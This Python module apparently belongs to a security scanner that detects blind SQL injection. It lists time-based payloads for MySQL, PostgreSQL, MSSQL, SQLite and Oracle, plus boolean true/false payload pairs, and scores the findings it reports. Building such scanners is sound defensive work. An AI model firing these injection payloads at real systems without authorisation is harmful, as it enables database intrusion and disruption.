"""Blind SQL injection detection — time-based and boolean-based techniques."""

from __future__ import annotations

import time

from basilisk.models import Finding
from basilisk.scoring import score_finding


TIME_PAYLOADS: list[dict] = [
    {"db": "MySQL", "payload": "' OR SLEEP(5)--", "delay": 5},
    {"db": "MySQL", "payload": "' AND SLEEP(5)--", "delay": 5},
    {"db": "MySQL", "payload": "1' AND (SELECT * FROM (SELECT SLEEP(5))x)--", "delay": 5},
    {"db": "PostgreSQL", "payload": "'; SELECT pg_sleep(5)--", "delay": 5},
    {"db": "PostgreSQL", "payload": "' OR pg_sleep(5)--", "delay": 5},
    {"db": "MSSQL", "payload": "'; WAITFOR DELAY '0:0:5'--", "delay": 5},
    {"db": "MSSQL", "payload": "' OR WAITFOR DELAY '0:0:5'--", "delay": 5},
    {"db": "SQLite", "payload": "' AND randomblob(100000000)--", "delay": 0},
    {"db": "Oracle", "payload": "' OR dbms_pipe.receive_message('x',5)--", "delay": 5},
    {"db": "Generic", "payload": "1' AND 1=2 UNION SELECT IF(1=1,SLEEP(5),0)--", "delay": 5},
    {"db": "Generic", "payload": "'; DECLARE @t INT; WAITFOR DELAY '0:0:5'--", "delay": 5},
    {"db": "MySQL", "payload": "' AND BENCHMARK(50000000,MD5('x'))--", "delay": 3},
]

BOOL_PAYLOADS: list[dict] = [
    {"true": "' AND 1=1--", "false": "' AND 1=2--"},
    {"true": "\" AND 1=1--", "false": "\" AND 1=2--"},
    {"true": "1 AND 1=1", "false": "1 AND 1=2"},
    {"true": "' OR '1'='1", "false": "' OR '1'='2"},
    {"true": "1' AND '1'='1", "false": "1' AND '1'='2"},
]

BLIND_SQLI_ERROR_SIGS = [
    "sql syntax", "mysql_fetch", "sqlite3.operationalerror",
    "unclosed quotation", "odbc", "postgresql",
]


def detect_time_based(
    true_response: dict | None,
    payload_entry: dict,
    target: str = "",
    actual_delay: float = 0,
) -> Finding | None:
    if not true_response:
        return None

    status = true_response.get("status_code", 0)
    body = true_response.get("body", "")
    expected_delay = payload_entry.get("delay", 5)
    db = payload_entry.get("db", "Unknown")

    lower_body = body.lower()
    for sig in BLIND_SQLI_ERROR_SIGS:
        if sig in lower_body:
            cvss, vector = score_finding("blind_sqli")
            return Finding(
                vulnerability=f"Blind SQL Injection ({db} - Error Based)",
                severity="Critical",
                description=f"SQL error '{sig}' triggered by time-based payload: {payload_entry['payload'][:60]}",
                target=target,
                attack_type="blind_sqli",
                payload=payload_entry["payload"],
                cvss_score=cvss,
                cvss_vector=vector,
                remediation="Use parameterized queries to prevent all SQL injection vectors.",
            )

    if actual_delay >= expected_delay * 0.8:
        cvss, vector = score_finding("blind_sqli")
        return Finding(
            vulnerability=f"Blind SQL Injection ({db} - Time Based)",
            severity="Critical",
            description=f"Time delay detected ({actual_delay:.2f}s vs expected {expected_delay}s). Database appears to be: {db}",
            target=target,
            attack_type="blind_sqli",
            payload=payload_entry["payload"],
            cvss_score=cvss,
            cvss_vector=vector,
            remediation="Use parameterized queries to prevent all SQL injection vectors.",
        )

    return None


def detect_boolean_based(
    true_response: dict | None,
    false_response: dict | None,
    payload_pair: dict,
    target: str = "",
) -> Finding | None:
    if not true_response or not false_response:
        return None

    true_status = true_response.get("status_code", 0)
    false_status = false_response.get("status_code", 0)
    true_body = true_response.get("body", "")
    false_body = false_response.get("body", "")
    true_len = len(true_body)
    false_len = len(false_body)

    error_sigs = ["sql syntax", "mysql_fetch", "sqlite3"]
    for sig in error_sigs:
        if sig in true_body.lower() or sig in false_body.lower():
            cvss, vector = score_finding("blind_sqli")
            return Finding(
                vulnerability="Blind SQL Injection (Boolean - Error Confirmed)",
                severity="Critical",
                description=f"Boolean-based blind SQLi confirmed. True/false payloads produce different responses ({true_len} vs {false_len} bytes).",
                target=target,
                attack_type="blind_sqli",
                payload=f"TRUE: {payload_pair['true'][:40]} || FALSE: {payload_pair['false'][:40]}",
                cvss_score=cvss,
                cvss_vector=vector,
                remediation="Use parameterized queries to prevent all SQL injection vectors.",
            )

    if true_status != false_status:
        cvss, vector = score_finding("blind_sqli")
        return Finding(
            vulnerability="Blind SQL Injection (Boolean - Status Based)",
            severity="High",
            description=f"True/false payloads produce different HTTP status codes ({true_status} vs {false_status}). Blind SQLi likely.",
            target=target,
            attack_type="blind_sqli",
            payload=f"TRUE: {payload_pair['true'][:40]} || FALSE: {payload_pair['false'][:40]}",
            cvss_score=cvss,
            cvss_vector=vector,
            confidence=0.7,
            remediation="Use parameterized queries to prevent all SQL injection vectors.",
        )

    if abs(true_len - false_len) > 20:
        cvss, vector = score_finding("blind_sqli")
        return Finding(
            vulnerability="Blind SQL Injection (Boolean - Content Based)",
            severity="High",
            description=f"True/false payloads produce different response sizes ({true_len} vs {false_len} bytes). Blind SQLi possible.",
            target=target,
            attack_type="blind_sqli",
            payload=f"TRUE: {payload_pair['true'][:40]} || FALSE: {payload_pair['false'][:40]}",
            cvss_score=cvss,
            cvss_vector=vector,
            confidence=0.6,
            remediation="Use parameterized queries to prevent all SQL injection vectors.",
        )

    return None


def get_time_payloads() -> list[dict]:
    return list(TIME_PAYLOADS)

def get_bool_payloads() -> list[dict]:
    return list(BOOL_PAYLOADS)
